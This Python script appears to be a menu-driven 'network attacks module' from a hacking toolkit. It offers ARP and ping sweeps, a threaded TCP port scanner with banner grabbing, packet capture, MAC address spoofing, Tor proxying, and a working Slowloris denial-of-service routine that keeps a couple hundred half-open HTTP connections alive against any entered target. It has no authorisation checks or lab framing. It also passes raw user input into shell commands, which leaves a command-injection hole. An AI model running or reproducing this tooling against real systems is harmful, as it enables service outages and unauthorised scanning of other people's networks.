#!/usr/bin/env python3
"""
NETWORK ATTACKS MODULE - N3XUS style
"""

import os, sys, time, socket, random, string, subprocess, threading, ipaddress
from datetime import datetime

C = type('C', (), {})
for name, code in [
    ('RED','\033[91m'),('GREEN','\033[92m'),('YELLOW','\033[93m'),
    ('BLUE','\033[94m'),('MAGENTA','\033[95m'),('CYAN','\033[96m'),
    ('WHITE','\033[97m'),('GRAY','\033[90m'),('BOLD','\033[1m'),
    ('DIM','\033[2m'),('RESET','\033[0m'),
]:
    setattr(C, name, code)

WORKSPACE = os.path.expanduser("~/n3xus-workspace")
RESULTS = os.path.join(WORKSPACE, "results")
os.makedirs(RESULTS, exist_ok=True)


def box_top(width=44):
    print(f"{C.WHITE}╔{'═' * width}╗{C.RESET}")


def box_mid(width=44):
    print(f"{C.WHITE}╠{'═' * width}╣{C.RESET}")


def box_bot(width=44):
    print(f"{C.WHITE}╚{'═' * width}╝{C.RESET}")


def box_text(text, width=44, color=None):
    col = color if color else C.WHITE
    pad = width - len(text) - 2
    if pad < 0:
        text = text[:width - 5] + "..."
        pad = width - len(text) - 2
    print(f"{C.WHITE}║{C.RESET} {col}{text}{C.RESET}{' ' * pad} {C.WHITE}║{C.RESET}")


class SimpleLog:
    def info(self, m):    print(f"{C.GRAY}[*]{C.RESET} {m}")
    def ok(self, m):      print(f"{C.GRAY}[+]{C.RESET} {m}")
    def warn(self, m):    print(f"{C.GRAY}[!]{C.RESET} {m}")
    def error(self, m):   print(f"{C.GRAY}[-]{C.RESET} {m}")
    def success(self, m): print(f"{C.GRAY}[✓]{C.RESET} {m}")
    def section(self, m):
        print(f"\n{C.WHITE}── {m} {'─' * max(1, 40 - len(m))}{C.RESET}")
    def end_section(self):
        print(f"{C.WHITE}{'─' * 44}{C.RESET}")
    def inp(self, m, d=""):
        v = input(f"{C.WHITE}[?]{C.RESET} {m} [{C.GRAY}{d}{C.RESET}]: ").strip()
        return v if v else d

log = SimpleLog()


def run(cmd, timeout=60):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        o, e = p.communicate(timeout=timeout)
        return p.returncode, o.strip(), e.strip()
    except subprocess.TimeoutExpired:
        p.kill()
        return -1, "", "TIMEOUT"
    except Exception as ex:
        return -1, "", str(ex)


def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def save(name, data):
    p = os.path.join(RESULTS, f"{name}_{timestamp()}.txt")
    with open(p, 'w') as f: f.write(data)
    log.ok(f"Saved -> {p}")
    return p


def port_open(host, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((host, port))
        s.close()
        return r == 0
    except: return False


def grab_banner(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.send(b"\r\n")
        b = s.recv(256).decode('utf-8','replace').strip()
        s.close()
        return b[:100]
    except: return ""


class Network:
    @staticmethod
    def menu():
        print()
        box_top()
        box_text("NETWORK ATTACKS MODULE", color=C.BOLD)
        box_mid()
        box_text("[01]  ARP Scan           Local discovery")
        box_text("[02]  Ping Sweep         ICMP scan")
        box_text("[03]  TCP Connect Scan   Port scan")
        box_text("[04]  SYN Scan           Stealth (root)")
        box_text("[05]  Packet Capture     tcpdump")
        box_text("[06]  DNS Sniffing       Port 53")
        box_text("[07]  MAC Changer        Spoof MAC")
        box_text("[08]  Slowloris          HTTP stress")
        box_text("[09]  Tor Proxy Chain    Anonymize")
        box_text("[10]  Show Interfaces    Network info")
        box_text("[00]  Back")
        box_bot()
        print()

    @staticmethod
    def arp_scan(network):
        log.section(f"ARP SCAN: {network}")
        log.info("Starting ARP discovery...")
        r, o, _ = run(f"nmap -sn {network}", 60)
        if r != 0:
            try:
                from scapy.all import ARP, Ether, srp
                arp = ARP(pdst=network)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                ans, _ = srp(ether/arp, timeout=3, verbose=0)
                for sent, recv in ans:
                    log.ok(f"{recv.psrc:<15} {recv.hwsrc}")
            except:
                log.error("Scapy not available. Install: pip install scapy")
        else:
            print(o)
        log.end_section()
        save(f"arp_{network.replace('/','_')}", o)

    @staticmethod
    def ping_sweep(network):
        log.section(f"PING SWEEP: {network}")
        try:
            net = ipaddress.ip_network(network, strict=False)
            found = []

            def ping(ip):
                r, _, _ = run(f"ping -c 1 -W 1 {ip}", 2)
                if r == 0:
                    found.append(str(ip))
                    log.ok(f"{ip} is alive")

            threads = []
            for ip in net.hosts():
                t = threading.Thread(target=ping, args=(ip,), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 20:
                    for t in threads: t.join()
                    threads = []
            for t in threads: t.join()

            log.info(f"Found {len(found)} live hosts")
            log.end_section()
            save(f"pingsweep_{network.replace('/','_')}", '\n'.join(found))
        except:
            log.error("Invalid network format. Use CIDR (e.g., 192.168.1.0/24)")

    @staticmethod
    def tcp_scan(target, start=1, end=1000):
        log.section(f"TCP SCAN: {target} ({start}-{end})")
        try:
            ip = socket.gethostbyname(target) if not ipaddress.ip_address(target) else target
        except:
            log.error(f"Cannot resolve {target}")
            return

        open_ports = []

        def scan(port):
            if port_open(ip, port):
                banner = grab_banner(ip, port)
                open_ports.append(port)
                log.ok(f"Port {port}/tcp OPEN {banner[:60]}")

        total = end - start + 1
        log.info(f"Scanning {total} ports...")

        for batch in range(start, end + 1, 50):
            batch_end = min(batch + 49, end)
            tlist = [threading.Thread(target=scan, args=(p,), daemon=True) for p in range(batch, batch_end + 1)]
            for t in tlist: t.start()
            for t in tlist: t.join()

        log.info(f"Found {len(open_ports)} open ports")
        log.end_section()
        save(f"tcp_{target}_{start}_{end}", '\n'.join(str(p) for p in open_ports))

    @staticmethod
    def packet_capture(interface, count=50):
        log.section(f"PACKET CAPTURE: {interface}")
        log.info(f"Capturing {count} packets...")
        run(f"tcpdump -i {interface} -c {count} -nn -X", 30)
        log.end_section()

    @staticmethod
    def mac_changer(interface, new_mac=None):
        log.section(f"MAC CHANGER: {interface}")
        if not new_mac:
            new_mac = ':'.join(f"{random.randint(0,255):02x}" for _ in range(6))
        log.info(f"New MAC: {new_mac}")

        cmds = [
            f"ifconfig {interface} down",
            f"ifconfig {interface} hw ether {new_mac}",
            f"ifconfig {interface} up"
        ]
        for cmd in cmds:
            r, _, e = run(cmd, 10)
            if r != 0:
                log.error(f"Failed: {e}")
                log.end_section()
                return
        log.success(f"MAC changed to {new_mac}")
        log.end_section()

    @staticmethod
    def slowloris(target, port=80, sockets=200):
        log.section(f"SLOWLORIS: {target}:{port}")
        target = target.replace('http://', '').replace('https://', '').split('/')[0]

        sent = 0
        socks = []

        log.info(f"Opening {sockets} connections...")
        try:
            for _ in range(sockets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                    socks.append(s)
                except: pass

            log.info(f"Established {len(socks)} connections. Holding...")
            while True:
                for s in socks[:]:
                    try:
                        s.send(f"X-{rand_str(8)}: {rand_str(16)}\r\n".encode())
                        sent += 1
                    except:
                        socks.remove(s)
                        try: s.close()
                        except: pass

                log.info(f"Sent {sent} headers, {len(socks)} sockets active")
                time.sleep(10)
        except KeyboardInterrupt:
            log.warn("Stopping")
            for s in socks:
                try: s.close()
                except: pass
            log.end_section()

    @staticmethod
    def proxy_tor():
        log.section("TOR PROXY")
        r, _, _ = run("which tor 2>/dev/null")
        if r != 0:
            log.info("Installing tor...")
            run("pkg install tor -y", 30)

        log.info("Starting Tor service...")
        run("tor --RunAsDaemon 1 2>/dev/null &", 5)
        time.sleep(3)

        log.info("Testing Tor connection...")
        r, o, _ = run("curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null", 10)
        if r == 0:
            log.success(f"Tor active! Response: {o[:100]}")
        else:
            log.error("Tor not responding. Run: tor &")
        log.end_section()

    @staticmethod
    def show_interfaces():
        log.section("NETWORK INTERFACES")
        run("ip addr 2>/dev/null || ifconfig 2>/dev/null || netstat -i 2>/dev/null", 5)
        log.end_section()


def network_menu():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        Network.menu()
        c = log.inp("Select option", "")

        handlers = {
            '1':  lambda: Network.arp_scan(log.inp("Network CIDR", "192.168.1.0/24")),
            '2':  lambda: Network.ping_sweep(log.inp("Network CIDR", "192.168.1.0/24")),
            '3':  lambda: Network.tcp_scan(log.inp("Target"), int(log.inp("Start port", "1")), int(log.inp("End port", "1000"))),
            '4':  lambda: log.info("SYN scan requires root. Use: nmap -sS <target>"),
            '5':  lambda: Network.packet_capture(log.inp("Interface", "wlan0"), int(log.inp("Packet count", "50"))),
            '6':  lambda: log.info("Run: tcpdump -i any port 53 -nn"),
            '7':  lambda: Network.mac_changer(log.inp("Interface", "wlan0")),
            '8':  lambda: Network.slowloris(log.inp("Target", "example.com")),
            '9':  Network.proxy_tor,
            '10': Network.show_interfaces,
        }
        handler = handlers.get(c)
        if handler:
            handler()
            if c not in ['5', '8']:
                input(f"\n{C.GRAY}Press Enter to continue...{C.RESET}")
        elif c == '0':
            break


if __name__ == "__main__":
    network_menu()
